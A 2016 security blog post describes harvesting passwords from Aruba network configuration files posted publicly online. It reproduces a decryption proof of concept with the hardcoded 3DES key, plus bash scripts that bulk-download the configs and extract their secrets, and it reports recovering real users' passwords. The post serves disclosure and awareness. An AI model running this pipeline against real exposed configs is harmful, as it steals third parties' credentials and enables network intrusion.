---
id: 447
title: Harvesting Passwords from Aruba Configs
date: 2016-08-18T10:09:01+00:00
author: Rich
layout: post
guid: http://bytesdarkly.com/?p=447
permalink: /2016/08/harvesting-passwords-from-aruba-configs/
categories:
  - Password Cracking
  - PowerShell
  - Python
---
_**UPDATE:** I actually received a very nice email from an Aruba Security Architect regarding this post. They are actively engaged in making their products more secure and addressing these issues. Could not ask for a better response from a vendor. Kudos._

## Intro

On a recent wireless assessment we ran across Aruba infrastructure. Since Sven Blumenstein, from Google Security Team, recently published [26 vulnerabilities](http://seclists.org/fulldisclosure/2016/May/19) for Aruba OS, Airwave Management Platform, and Aruba Instant I was eager to start the vulnerability analysis phase to see if our targets were still vulnerable to his findings. The entire write-up is really nicely done, and shows a full range of vulnerabilities in Aruba products, but I want to focus on #26 because I believe the impact is far worse than it appears. Finding #26 references CVE-2014-7299 which describes storage of Aruba password hashes as &#8220;encrypted password hashes&#8221;.  You can read the details on the original disclosure, but in short passwords displayed in the Aruba config files are not hashed- they are encrypted with 3DES in CBC mode. If you were to enter the _show running-config_ command you might see something like this:

<p style="text-align: center;">
  <em>mgmt-user admin f9ac59cd431e174fb07539a8a811a1aa</em>
</p>

This is all well and good unless, of course, a malicious actor had the decryption key. Quoting straight from the disclosure:

> The encryption algorithm uses a 24 byte static key which is hardcoded on the AP. Sampling of different Firmware versions confirmed that the key is identical for all available versions. The IV required for 3DES consists of 8 random bytes, and is stored as the first 8 byte of the encrypted password.

Going one step further a Proof-of-Concept (PoC) decryption script is included in the write-up to make it easy to recover encrypted passwords.

<pre style="font-family: arial; font-size: 12px; border: 1px dashed #CCCCCC; width: 99%; height: auto; overflow: auto; background: #f0f0f0; padding: 0px; color: #000000; text-align: left; line-height: 20px;"><code style="color: #000000; word-wrap: normal;">  import pyDes  
  hashes = (  
   'f9ac59cd431e174fb07539a8a811a1aa', # admin  
   'd7a75c655b8e2fb8609d0b04275e02767f2dfae8c63088cf' # adminadmin  
  )  
  key = (  
   '\x32\x74\x10\x84\x91\x17\x75\x46\x14\x75\x82\x92'  
   '\x43\x49\x04\x59\x18\x69\x15\x94\x27\x84\x30\x03'  
  )  
  for h in hashes:  
   d = pyDes.triple_des(key, pyDes.CBC, h.decode('hex')[:8], pad='\00')  
   print h, '=&gt;', d.decrypt(h.decode('hex')[8:])  
</code></pre>

&nbsp;<figure id="attachment_468" style="width: 548px" class="wp-caption aligncenter">

[<img class="size-full wp-image-468" src="//images/2016/08/aruba_decrypt_example.png" alt="Decrypting POC" width="548" height="180" srcset="//images/2016/08/aruba_decrypt_example.png 548w, //images/2016/08/aruba_decrypt_example-300x99.png 300w" sizes="(max-width: 548px) 100vw, 548px" />](//images/2016/08/aruba_decrypt_example.png)</figure> 

Ok, so encrypting passwords (vs. hashing) is, unfortunately, a fairly common practice. The [Adobe breach in 2013](https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/) revealed similar findings, but in that case the decryption key was never revealed publicly. In response to this disclosure Aruba issued an [advisory](http://www.arubanetworks.com/assets/alert/ARUBA-PSA-2016-004.txt) that, well, sort of acknowledged the issue, but down played the impact. Below are a few partial quotes from the advisory:

> &#8230;All passwords in an IAP configuration file are stored using reversible encryption&#8230;**The configuration file should never be exposed to an attacker**&#8230;Aruba does not consider this a vulnerability, but the behavior does not follow industry best practices for security and defense-in-depth&#8230;

This is an interesting response when you consider the following Google search<figure id="attachment_470" style="width: 864px" class="wp-caption aligncenter">

[<img class="size-full wp-image-470" src="//images/2016/08/aruba_google_search1.png" alt="Google Dork for Aruba Configs" width="864" height="457" srcset="//images/2016/08/aruba_google_search1.png 864w, //images/2016/08/aruba_google_search1-300x159.png 300w, //images/2016/08/aruba_google_search1-768x406.png 768w" sizes="(max-width: 864px) 100vw, 864px" />](//images/2016/08/aruba_google_search1.png)</figure> 

Clicking on one of these links from the Aruba Support forum takes me to a config file that someone has uploaded, I&#8217;m presuming, in conjunction with a support question. Going one step further, if I narrow the scope down to just _arubanetworks.com_ we get 107 results alone! At least one of these configs has been posted in the last month (Jul 27, 2016) so I&#8217;m assuming this issue hasn&#8217;t been brought up with Aruba customers.<figure id="attachment_474" style="width: 523px" class="wp-caption aligncenter">

[<img class="wp-image-474 size-full" src="//images/2016/08/config_wpa_passphrase.png" alt="config_wpa_passphrase" width="523" height="350" srcset="//images/2016/08/config_wpa_passphrase.png 523w, //images/2016/08/config_wpa_passphrase-300x201.png 300w" sizes="(max-width: 523px) 100vw, 523px" />](//images/2016/08/config_wpa_passphrase.png)</figure> 

&nbsp;<figure id="attachment_471" style="width: 770px" class="wp-caption aligncenter">

[<img class="size-full wp-image-471" src="//images/2016/08/aruba_google_search2.png" alt="More configs" width="770" height="254" srcset="//images/2016/08/aruba_google_search2.png 770w, //images/2016/08/aruba_google_search2-300x99.png 300w, //images/2016/08/aruba_google_search2-768x253.png 768w" sizes="(max-width: 770px) 100vw, 770px" />](//images/2016/08/aruba_google_search2.png)</figure> 

&nbsp;

So lets review what we know so far- _configuration files posted publicly on the Internet, and contain credentials, can now be easily decrypted_. Just great.

Further, it&#8217;s not just the _mgmt-user_ setting that can be decrypted either. With just a cursory look I identified a number of stored passwords that can be extracted from Aruba config files.

<pre style="font-family: arial; font-size: 12px; border: 1px dashed #CCCCCC; width: 99%; height: auto; overflow: auto; background: #f0f0f0; padding: 0px; color: #000000; text-align: left; line-height: 20px;"><code style="color: #000000; word-wrap: normal;"> wpa-passphrase &lt;hash&gt;  
 key &lt;hash&gt;  
 mgmt-user &lt;uname&gt; &lt;level&gt; &lt;hash&gt;  
 ip pppoe-password &lt;hash&gt;  
 ike authentication PRE-SHARE &lt;hash&gt;  
 arm-rf-domain-key "&lt;hash&gt;"  
 user &lt;uname&gt; &lt;hash&gt; &lt;junk&gt;  
 Airwave Shared Key:&lt;hash&gt;  
 Master Key:&lt;hash&gt;  
 localip &lt;ip&gt; ipsec &lt;hash&gt;  
 ams-key &lt;hash&gt;  
 ams-identity &lt;hash&gt;  
 snmp-server community &lt;hash&gt;  
 opendns &lt;domain&gt; &lt;hash&gt;  
</code></pre>

&nbsp;

## The Harvest

With just a little bit of scripting one can easily start harvesting these credentials. First you&#8217;ll need to gather all the links to the config files posted online. I&#8217;m going to leave this step as an exercise for the reader. I used PowerShell, but feel free to use you&#8217;re favorite technique. (As a side note, Google is a fun sparing partner when it comes to parsing search results.)

The next step is to download all the configs. A simple Bash 1-liner will take care of that part.

<pre style="font-family: arial; font-size: 12px; border: 1px dashed #CCCCCC; width: 99%; height: auto; overflow: auto; background: #f0f0f0; padding: 0px; color: #000000; text-align: left; line-height: 20px;"><code style="color: #000000; word-wrap: normal;"> for i in $(cat aruba_links.txt); do wget $i --timeout 10 --tries 2; done  
</code></pre>

&nbsp;<figure id="attachment_467" style="width: 721px" class="wp-caption aligncenter">

[<img class="size-full wp-image-467" src="//images/2016/08/aruba_config_download.png" alt="Quick one liner to download all the configs" width="721" height="323" srcset="//images/2016/08/aruba_config_download.png 721w, //images/2016/08/aruba_config_download-300x134.png 300w" sizes="(max-width: 721px) 100vw, 721px" />](//images/2016/08/aruba_config_download.png)</figure> 

&nbsp;

Next we need to extract the hashes. There are many ways to do this, but I chose to use grep as a simple parser. The downside is that it&#8217;s not a very clean technique, and I ended up with a lot of junk in the results file. Rather than spend too much time on this I just clean-up the results manually by removing non-hashes by hand. If I were to build a general purpose tool I&#8217;d get more fancy with this step by maybe using [ciscocongparse](https://pypi.python.org/pypi/ciscoconfparse) to get more accurate results.

<pre style="font-family: arial; font-size: 12px; border: 1px dashed #CCCCCC; width: 99%; height: auto; overflow: auto; background: #f0f0f0; padding: 0px; color: #000000; text-align: left; line-height: 20px;"><code style="color: #000000; word-wrap: normal;"> #!/bin/bash  
 outfile="config_hashes.txt"  
 config_file=configs/*.txt  
 grep -o 'wpa-passphrase.*' $config_file | cut -d " " -f 2 &gt;&gt; $outfile  
 grep -o 'key .*' $config_file | cut -d " " -f 2 &gt;&gt; $outfile  
 grep -o 'mgmt-user.*' $config_file | cut -d " " -f 3 &gt;&gt; $outfile   
 grep -o 'mgmt-user.*' $config_file | cut -d " " -f 4 &gt;&gt; $outfile   
 grep -o 'ip pppoe-password.*' $config_file | cut -d " " -f 3 &gt;&gt; $outfile  
 grep -o 'ike authentication PRE-SHARE. *' $config_file | cut -d " " -f 4 &gt;&gt; $outfile  
 grep -o 'ike authentication PRE-SHARE .*' $config_file | cut -d " " -f 5 &gt;&gt; $outfile  
 grep -o 'arm-rf-domain-key.*' $config_file | cut -d " " -f 2 | tr -d '"' &gt;&gt; $outfile   
 grep -o 'user.*' $config_file | cut -d " " -f 3 &gt;&gt; $outfile   
 grep -o 'user.*' $config_file | cut -d " " -f 4 &gt;&gt; $outfile   
 grep -o 'Airwave Shared.*' $config_file | cut -d ":" -f 3 &gt;&gt; $outfile  
 grep -o 'Master Key.*' $config_file | cut -d ":" -f 3 &gt;&gt; $outfile  
 grep -o 'localip.*' $config_file | cut -d " " -f 4 &gt;&gt; $outfile  
 grep -o 'ams-key.*' $config_file | cut -d " " -f 2 &gt;&gt; $outfile  
 grep -o 'ams-key.*' $config_file | cut -d " " -f 4 &gt;&gt; $outfile  
 grep -o 'ams-identity.*' $config_file | cut -d " " -f 2 &gt;&gt; $outfile  
 grep -o 'ams-identity.*' $config_file | cut -d " " -f 4 &gt;&gt; $outfile  
 grep -o 'snmp-server community.*' $config_file | cut -d " " -f 3 &gt;&gt; $outfile  
 grep -o 'snmp-server community.*' $config_file | cut -d " " -f 5 &gt;&gt; $outfile  
 grep -o 'opendns.*' $config_file | cut -d " " -f 3 &gt;&gt; $outfile  
 grep -o 'enable secret.*' $config_file | cut -d " " -f 3 &gt;&gt; $outfile  
 grep -o 'enable secret.*' $config_file | cut -d " " -f 4 &gt;&gt; $outfile  
 grep -o 'enable secret.*' $config_file | cut -d " " -f 5 &gt;&gt; $outfile  
 grep -o 'wepkey1.*' $config_file | cut -d " " -f 2 &gt;&gt; $outfile  
</code></pre>

&nbsp;

## Decrypting

Now that we have a file full of hashes we can use the PoC Python code to recover some of the passwords. In this case I was able decrypt 99 passwords and another 62 hashes were filtered out. The filtered hashes are MD5 or other formats not recoverable with the Python script used here.<figure id="attachment_465" style="width: 736px" class="wp-caption aligncenter">

[<img class="size-full wp-image-465" src="//images/2016/08/aruab_decrypt_file.png" alt="Decrypting " width="736" height="172" srcset="//images/2016/08/aruab_decrypt_file.png 736w, //images/2016/08/aruab_decrypt_file-300x70.png 300w" sizes="(max-width: 736px) 100vw, 736px" />](//images/2016/08/aruab_decrypt_file.png)</figure> 

&nbsp;<figure id="attachment_469" style="width: 723px" class="wp-caption aligncenter">

[<img class="size-full wp-image-469" src="//images/2016/08/aruba_decrypt_result.png" alt="Verbose decrypt" width="723" height="289" srcset="//images/2016/08/aruba_decrypt_result.png 723w, //images/2016/08/aruba_decrypt_result-300x120.png 300w" sizes="(max-width: 723px) 100vw, 723px" />](//images/2016/08/aruba_decrypt_result.png)</figure> 

&nbsp;

Just from the results above we can see the usual offenders like _1234qwer, aruba123,_ and other easily recoverable passwords. After removing the duplicates and running [statsgen](https://github.com/iphelix/pack) we ended up 86 passwords, and all in less time it took to drink a cup of coffee.

&nbsp;<figure id="attachment_466" style="width: 685px" class="wp-caption aligncenter">

[<img class="size-full wp-image-466" src="//images/2016/08/aruab_statsgen.png" alt="PACK statsgen.py" width="685" height="437" srcset="//images/2016/08/aruab_statsgen.png 685w, //images/2016/08/aruab_statsgen-300x191.png 300w" sizes="(max-width: 685px) 100vw, 685px" />](//images/2016/08/aruab_statsgen.png)</figure> 

&nbsp;

For those that are interested below is the full output from statsgen.

&nbsp;

<pre style="font-family: arial; font-size: 12px; border: 1px dashed #CCCCCC; width: 99%; height: auto; overflow: auto; background: #f0f0f0; padding: 0px; color: #000000; text-align: left; line-height: 20px;"><code style="color: #000000; word-wrap: normal;">  statsGen 0.0.3 | |  
  _ __ __ _ ___| | _  
  | '_ \ / _` |/ __| |/ /  
  | |_) | (_| | (__| &lt;   
  | .__/ \__,_|\___|_|\_\  
  | |   
  |_| iphelix@thesprawl.org  
  
  [*] Analyzing passwords in [../recovered.txt]  
  [+] Analyzing 100% (86/86) of passwords  
  NOTE: Statistics below is relative to the number of analyzed passwords, not total number of passwords  
  [*] Length:  
  [+] 8: 27% (24)  
  [+] 10: 19% (17)  
  [+] 9: 12% (11)  
  [+] 5: 10% (9)  
  [+] 11: 09% (8)  
  [+] 6: 05% (5)  
  [+] 13: 04% (4)  
  [+] 12: 03% (3)  
  [+] 26: 02% (2)  
  [+] 7: 01% (1)  
  [+] 17: 01% (1)  
  [+] 19: 01% (1)  
  [*] Character-set:  
  [+] loweralphanum: 32% (28)  
  [+] loweralpha: 26% (23)  
  [+] all: 24% (21)  
  [+] numeric: 03% (3)  
  [+] mixedalphanum: 03% (3)  
  [+] loweralphaspecialnum: 03% (3)  
  [+] upperalphanum: 02% (2)  
  [+] loweralphaspecial: 02% (2)  
  [+] mixedalphaspecial: 01% (1)  
  [*] Password complexity:  
  [+] digit: min(0) max(14)  
  [+] lower: min(0) max(12)  
  [+] upper: min(0) max(5)  
  [+] special: min(0) max(4)  
  [*] Simple Masks:  
  [+] othermask: 31% (27)  
  [+] string: 26% (23)  
  [+] stringdigit: 19% (17)  
  [+] digitstring: 05% (5)  
  [+] stringspecialdigit: 04% (4)  
  [+] stringdigitspecial: 04% (4)  
  [+] stringdigitstring: 03% (3)  
  [+] digit: 03% (3)  
  [*] Advanced Masks:  
  [+] ?l?l?l?l?l: 10% (9)  
  [+] ?l?l?l?l?l?l?l?l: 09% (8)  
  [+] ?l?l?l?l?l?l?l?d: 05% (5)  
  [+] ?l?u?s?l?d?l?d?l?s?s: 04% (4)  
  [+] ?l?l?l?l?l?d?d?d?d: 04% (4)  
  [+] ?u?l?l?l?l?d?d?d?s: 04% (4)  
  [+] ?d?d?d?d?l?l?l?l: 03% (3)  
  [+] ?l?l?l?l?l?l: 03% (3)  
  [+] ?l?d?l?d?l?d?d?d?d?d?d: 03% (3)  
  [+] ?l?l?l?l?l?l?d?d?d: 03% (3)  
  [+] ?u?l?d?l?u?l?d?u?u?d: 03% (3)  
  [+] ?l?l?l?l?d?l?l?l?l?l: 02% (2)  
  [+] ?u?s?l?l?l?d?l?l: 02% (2)  
  [+] ?l?l?l?l?l?s?l?l?l?l?s?l?l: 02% (2)  
  [+] ?l?l?l?l?l?l?d?d?d?d?d?d?d?l?l?l?l?l?l?d?d?d?d?d?d?d: 02% (2)  
  [+] ?u?l?u?l?s?s?s?s?l?l?d?d: 02% (2)  
  [+] ?d?d?d?d?d?d?d?d: 02% (2)  
  [+] ?l?l?l?l?l?l?l?l?l?l: 02% (2)  
  [+] ?d?d?d?l?l?l?l?l?l?l: 02% (2)  
  [+] ?u?l?s?u?l?u?s?d?d?l?l?l?d: 02% (2)  
  [+] ?u?d?l?l?u?s?l?l?l?l?l: 02% (2)  
  [+] ?l?l?l?s?d?d?d?d: 02% (2)  
  [+] ?u?d?d?d?d?d: 02% (2)  
  [+] ?l?l?l?l?l?l?l?d?d?d: 02% (2)  
  [+] ?u?d?l?u?l?d?s?l?s?l?l: 02% (2)  
  [+] ?u?s?l?l?d?l?l?u?s?l?l?l?l?l?l?d?d?d?d: 01% (1)  
  [+] ?d?d?d?d?d?d?d?d?d?d: 01% (1)  
  [+] ?l?l?l?l?d?l?l?l?l?l?l: 01% (1)  
  [+] ?u?l?l?l?l?l?s?d: 01% (1)  
  [+] ?u?d?l?d?u?l?s?u?l?s: 01% (1)  
  [+] ?l?l?l?l?l?l?l: 01% (1)  
  [+] ?l?l?u?s?l?u?l?l?u?s?u?l?l?l?s?l?u: 01% (1)  
  [+] ?l?l?l?l?l?d?d?d: 01% (1)  
  [+] ?l?l?l?l?l?l?l?l?l?s?d?d: 01% (1)  
</code></pre>

&nbsp;

## Conclusion

Posting configs online is not anything new, but overall this is very frustrating for me as a security professional. I spend a lot of time making recommendations for securing systems, but no amount of configuring or fancy equipment can protect you if you&#8217;re posting your passwords online. I&#8217;m sure some of you are saying, &#8220;but they were encrypted..how was I suppose to know?&#8221;. Which brings me to my main point &#8211; assume breach, assume compromise, assume your awesome passwords will be cracked. And stop making it easy by posting your configs on a publicly accessible site! When used correctly encryption is the foundation of a secure Internet, but it&#8217;s not cyber pixie dust that magically protects you from everything bad online. If you&#8217;ve ever posted a config online go and change those passwords now; otherwise you are at risk.